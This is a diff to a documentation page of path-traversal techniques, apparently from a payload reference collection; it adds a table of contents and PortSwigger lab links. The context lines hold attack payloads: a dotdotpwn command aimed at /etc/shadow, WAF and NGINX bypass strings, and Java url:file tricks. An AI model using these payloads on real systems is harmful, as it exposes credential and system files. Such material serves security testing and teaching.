@@ -1,19 +1,34 @@
 +++
 type = "docs"
 title = "Directory Traversal"
-date = "2022-10-16"
+date = "2023-03-28"
 description = "All about directory traversal techniques, methods, payloads, how/why/when they work."
+include_toc = 'true'
 +++
 
-# Directory traversal
+# Directory Traversal
 
 > A directory or path traversal consists in exploiting insufficient security validation / sanitization of user-supplied input file names, so that characters representing "traverse to parent directory" are passed through to the file APIs.
+## Summary
 
+* [Tools](#tools)
+* [Basic exploitation](#basic-exploitation)
+    * [16 bits Unicode encoding](#16-bits-unicode-encoding)
+    * [UTF-8 Unicode encoding](#utf-8-unicode-encoding)
+    * [Bypass "../" replaced by ""](#bypass--replaced-by-)
+    * [Bypass "../" with ";"](#bypass--with-)
+    * [Double URL encoding](#double-url-encoding)
+    * [UNC Bypass](#unc-bypass)
+    * [NGINX/ALB Bypass](#nginxalb-bypass)
+* [Path Traversal](#path-traversal)
+    * [Interesting Linux files](#interesting-linux-files)
+    * [Interesting Windows files](#interesting-windows-files)
+* [References](#references)
 
 ## Tools
 
 - [dotdotpwn - https://github.com/wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn)
-    ```bash
+    ```powershell
     git clone https://github.com/wireghoul/dotdotpwn
     perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
     ```
@@ -61,7 +76,7 @@ Sometimes you encounter a WAF which remove the "../" characters from the strings
 
 ```powershell
 ..;/
-http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
+http://domain.tld/page.jsp?include=..;/..;/sensitive.txt
 ```
 
 ### Double URL encoding
@@ -86,15 +101,10 @@ An attacker can inject a Windows UNC share ('\\UNC\share\name') into a software 
 
 NGINX in certain configurations and ALB can block traversal attacks in the route, For example:
 ```http://nginx-server/../../``` will return a 400 bad request.
-
 To bypass this behaviour just add forward slashes in front of the url:
 ```http://nginx-server////////../../```
-
-
 ### Java Bypass
-
 Bypass Java's URL protocol
-
 ```powershell
 url:file:///etc/passwd
 url:http://127.0.0.1:8080
@@ -137,7 +147,7 @@ url:http://127.0.0.1:8080
 
 ### Interesting Windows files
 
-Always existing file in recent Windows machine. 
+Always existing file in recent Windows machine.
 Ideal to test path traversal but nothing much interesting inside...
 
 ```powershell
@@ -186,6 +196,14 @@ The following log files are controllable and can be included with an evil payloa
 /var/log/sshd.log
 /var/log/mail
 ```
+## Labs
+
+* [File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)
+* [File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
+* [File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
+* [File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)
+* [File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
+* [File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)
 
 ## References
 
